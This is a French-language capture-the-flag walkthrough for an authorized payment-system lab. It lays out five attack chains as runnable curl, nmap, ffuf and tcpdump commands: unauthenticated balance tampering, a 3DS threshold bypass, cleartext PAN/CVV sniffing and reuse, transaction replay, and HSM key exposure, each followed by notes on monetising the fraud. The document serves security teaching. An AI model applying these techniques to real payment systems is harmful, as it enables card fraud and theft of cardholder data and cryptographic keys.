# CTF PMP - 5 Walkthroughs realistes (vrai mode attaquant blackbox)

Ce document est pour un lab autorise PMP.  
Ici, l'attaquant **ne connait pas** les endpoints internes a l'avance.

Chaque attaque suit le meme modele:
1. Reconnaissance (ce que l'attaquant decouvre).
2. Hypothese.
3. Validation.
4. Exploitation.
5. Post-exploitation (objectif final, pas juste le flag).

---

## 0) Setup "AttackBox" et methode de base

### Outils de la machine attaquante
- `nmap`, `ffuf`
- `curl`, `jq`, `httpie`
- `tcpdump` ou `tshark`
- `python3`, `bash`, `rg`

### Workflow realiste (a reutiliser pour tous les labs)
```bash
# 0) Journaliser la session (trace attaquant)
script -q /tmp/attack-session.log

# 1) Trouver le reseau de l'AttackBox
ip a
ip route

# 2) Decouvrir les hosts actifs (adapter le CIDR)
nmap -sn 172.18.0.0/24 -oN /tmp/hosts.txt

# 3) Scanner ports/services
nmap -sV -p 8000-8030 172.18.0.0/24 -oN /tmp/services.txt

# 4) Fuzz endpoints sur un host:port trouve
cat >/tmp/words.txt <<'EOF'
health
status
api
auth
register
login
transaction
transactions
accounts
hsm
keys
config
challenge
authenticate
EOF

ffuf -u http://TARGET:PORT/FUZZ -w /tmp/words.txt -mc 200,201,204,301,302,400,401,403
```

Note importante:
- en vrai blackbox, l'attaquant utilise les **messages d'erreur** pour deduire le schema JSON attendu;
- il pivote d'un service a l'autre via ce qu'il observe dans les reponses ou le trafic.

---

## 1) Attaque #1 - Privilege Escalation / Balance tampering (PRIV-001)

### But attaquant
Creer du faux solde puis convertir ce solde en achats valides.

### Phase A - Recon (sans connaissance prealable)
1. Scan: un service expose sur `:8005`.
2. Fuzz: endpoints trouves `GET /accounts`, `GET /accounts/:pan`, `PATCH /accounts/:pan/balance`.
3. Test sans token: les routes repondent quand meme -> soupcon "no auth".

Commandes:
```bash
curl -s http://TARGET:8005/accounts | jq
```

L'attaquant recupere des PAN existants.

### Phase B - Validation de la faille
```bash
PAN=4111111111111111
curl -s -X PATCH "http://TARGET:8005/accounts/$PAN/balance" \
  -H 'Content-Type: application/json' \
  -d '{"balance":999999}' | jq

curl -s "http://TARGET:8005/accounts/$PAN" | jq
```

Si le nouveau solde est visible, la prise de controle est confirmee.

### Phase C - Post-exploitation (objectif fraude)
L'attaquant ne garde pas juste "balance modifiee".  
Il monetise via paiements.

```bash
for AMOUNT in 299.99 499.99 899.99; do
  curl -s -X POST "http://TARGET:8002/transactions" \
    -H 'Content-Type: application/json' \
    -d "{\"pan\":\"$PAN\",\"amount\":$AMOUNT,\"currency\":\"EUR\",\"merchantId\":\"M123\",\"transactionType\":\"PURCHASE\",\"cvv\":\"123\",\"expiryMonth\":12,\"expiryYear\":2026}" \
    | jq '{success:.success,status:.data.status,responseCode:.data.responseCode,tx:.data.transactionId}'
done
```

### Ce que l'attaquant gagne
- creation de valeur fictive;
- cash-out progressif;
- impact direct comptable et financier.

---

## 2) Attaque #2 - 3DS threshold bypass en CNP (3DS-003)

### But attaquant
Eviter le challenge 3DS en restant juste sous le seuil de declenchement.

### Phase A - Recon
1. Service gateway detecte sur `:8000`.
2. Fuzz: endpoint transaction trouve (ex: `/api/transaction/process`).
3. L'endpoint demande auth -> l'attaquant cree un compte marchand legitime (surface publique).

Exemple (public auth):
```bash
curl -s -X POST http://TARGET:8000/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"evilm1","email":"evilm1@lab.local","password":"LabTest123!","role":"ROLE_MARCHAND"}' | jq

TOKEN_M=$(curl -s -X POST http://TARGET:8000/api/auth/marchand/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"evilm1@lab.local","password":"LabTest123!"}' | jq -r '.accessToken')
```

### Phase B - Discovery du seuil (attaquant n'a pas la valeur)
Test A/B:
```bash
# test montant haut
curl -s -X POST http://TARGET:8000/api/transaction/process \
  -H "Authorization: Bearer $TOKEN_M" \
  -H 'Content-Type: application/json' \
  -d '{"pan":"4111111111111111","amount":500,"currency":"EUR","merchantId":"M123","terminalId":"WEB001","isEcommerce":true}' | jq

# test juste en dessous
curl -s -X POST http://TARGET:8000/api/transaction/process \
  -H "Authorization: Bearer $TOKEN_M" \
  -H 'Content-Type: application/json' \
  -d '{"pan":"4111111111111111","amount":499.99,"currency":"EUR","merchantId":"M123","terminalId":"WEB001","isEcommerce":true}' | jq
```

Observation:
- a 500: challenge/step supplementaire;
- a 499.99: autorisation directe.

### Phase C - Post-exploitation
Industrialisation de micro-fraudes sous seuil:
```bash
for i in 1 2 3 4 5; do
  curl -s -X POST http://TARGET:8000/api/transaction/process \
    -H "Authorization: Bearer $TOKEN_M" \
    -H 'Content-Type: application/json' \
    -d '{"pan":"4111111111111111","amount":499.99,"currency":"EUR","merchantId":"M123","terminalId":"WEB001","isEcommerce":true}' \
    | jq '{approved,responseCode,authorizationCode}'
done
```

### Ce que l'attaquant gagne
- contournement SCA;
- meilleur taux d'acceptation pour fraude CNP;
- volume en "smurfing" pour rester sous radar.

---

## 3) Attaque #3 - MITM CVV en clair puis rejeu (MITM-001)

### But attaquant
Intercepter des donnees carte sensibles en transit, puis les reutiliser.

### Phase A - Recon reseau
1. Scan ports: flux transactionnel sur `:8002/:8003`.
2. Hypothese: trafic HTTP non chiffre entre microservices.
3. Capture passive pour confirmer.

```bash
sudo tcpdump -i any -A -s 0 'tcp port 8002 or tcp port 8003' | tee /tmp/mitm.log
```

Dans un 2e terminal (trafic victime/leurre):
```bash
curl -s -X POST http://TARGET:8002/transactions \
  -H 'Content-Type: application/json' \
  -d '{"pan":"4111111111111111","amount":61.90,"currency":"EUR","merchantId":"M123","transactionType":"PURCHASE","cvv":"123","expiryMonth":12,"expiryYear":2026}' | jq
```

Extraction:
```bash
grep -Eo '"pan":"[0-9]{13,19}"' /tmp/mitm.log | head
grep -Eo '"cvv":"[0-9]{3,4}"' /tmp/mitm.log | head
```

### Phase B - Exploitation
Une fois PAN+CVV observes, l'attaquant tente ses propres achats.

```bash
PAN=4111111111111111
CVV=123
for AMOUNT in 79.99 119.99 149.99; do
  curl -s -X POST http://TARGET:8002/transactions \
    -H 'Content-Type: application/json' \
    -d "{\"pan\":\"$PAN\",\"amount\":$AMOUNT,\"currency\":\"EUR\",\"merchantId\":\"M123\",\"transactionType\":\"PURCHASE\",\"cvv\":\"$CVV\",\"expiryMonth\":12,\"expiryYear\":2026}" \
    | jq '{success:.success,status:.data.status,responseCode:.data.responseCode,tx:.data.transactionId}'
done
```

### Phase C - Post-exploitation
- repetition sur plusieurs cartes capturees;
- revente des donnees PAN/CVV;
- fraude rapide avant opposition carte.

---

## 4) Attaque #4 - Replay transaction (REPLAY-001)

### But attaquant
Faire accepter plusieurs fois la meme intention de paiement.

### Phase A - Recon
1. L'attaquant observe une requete ISO-like valide (capture MITM ou test).
2. Il remarque les champs transactionnels (`stan`, `arn`, etc.).
3. Hypothese: pas de controle anti-rejeu strict.

### Phase B - Validation par rejeu exact
```bash
cat >/tmp/replay.json <<'EOF'
{
  "mti":"0100",
  "pan":"4111111111111111",
  "processingCode":"000000",
  "amount":99.99,
  "currency":"EUR",
  "transmissionDateTime":"0101120000",
  "localTransactionTime":"120000",
  "localTransactionDate":"0101",
  "stan":"777777",
  "terminalId":"TERM0001",
  "merchantId":"M123",
  "merchantCategoryCode":"5411",
  "expiryDate":"2612",
  "posEntryMode":"010",
  "acquirerReferenceNumber":"ARN1234567890123456789"
}
EOF

for i in 1 2; do
  curl -s -X POST http://TARGET:8004/transaction \
    -H 'Content-Type: application/json' \
    --data-binary @/tmp/replay.json \
    | jq '{success:.success,responseCode:.data.responseCode,authorizationCode:.data.authorizationCode}'
done
```

Si les 2 passent, la faille est validee.

### Phase C - Post-exploitation
- automatisation du rejeu;
- multiplication de debits sur meme carte;
- generation de litiges/chargebacks.

---

## 5) Attaque #5 - HSM exposed admin + leakage path (HSM-001 / HSM-003)

### But attaquant
Acceder a du materiel cryptographique et renforcer ses capacites de fraude.

### Phase A - Recon
1. Scan: service sur `:8011`.
2. Fuzz:
```bash
ffuf -u http://TARGET:8011/FUZZ -w /tmp/words.txt -mc 200,201,204,400,401,403
ffuf -u http://TARGET:8011/hsm/FUZZ -w /tmp/words.txt -mc 200,201,204,400,401,403
```
3. Endpoints decouverts: `/hsm/status`, `/hsm/keys`, `/hsm/config`, `/hsm/generate-mac`, etc.

### Phase B - Exploitation
```bash
# 1) Lecture de cles admin sans auth
curl -s http://TARGET:8011/hsm/keys | jq

# 2) Lire config vuln
curl -s http://TARGET:8011/hsm/config | jq

# 3) Activer mode de fuite
curl -s -X POST http://TARGET:8011/hsm/config \
  -H 'Content-Type: application/json' \
  -d '{"vulnerabilities":{"keyLeakInLogs":true}}' | jq

# 4) Forcer des operations sensibles
curl -s -X POST http://TARGET:8011/hsm/generate-mac \
  -H 'Content-Type: application/json' \
  -d '{"data":"pan=4111111111111111&amount=9999","keyLabel":"ZAK_002"}' | jq
```

### Phase C - Post-exploitation
Selon acces de l'attaquant:
- soit il lit directement la sortie logs du lab;
- soit il exploite la connaissance des cles/labels pour signer ou simuler des flux "legitimes".

Exemple d'usage malveillant:
```bash
curl -s -X POST http://TARGET:8011/hsm/generate-mac \
  -H 'Content-Type: application/json' \
  -d '{"data":"merchant=M123&amount=4999&pan=4111111111111111","keyLabel":"ZAK_002"}' | jq
```

### Ce que l'attaquant gagne
- avantage cryptographique (ou pseudo-cryptographique);
- elevation de confiance sur des messages frauduleux;
- impact sur integrite des controles.

---

## 6) Ce qu'il faut absolument donner a l'etudiant (experience realiste)

Pour chaque lab:
1. Un terminal dedie (AttackBox) dans le meme reseau.
2. Une wordlist de base (petite) pour `ffuf`.
3. Des traces observables (logs, PCAP, ou timeline API) pour faire de la vraie investigation.
4. Pas de hint direct d'endpoint au debut.
5. Hints progressifs debloques seulement apres echec recon.

Mode "vrai attaquant":
- l'etudiant part d'un scan reseau et d'erreurs API;
- il construit ses hypotheses;
- il prouve et monetise la faille;
- il documente la chaine complete (recon -> exploit -> post-exploit).
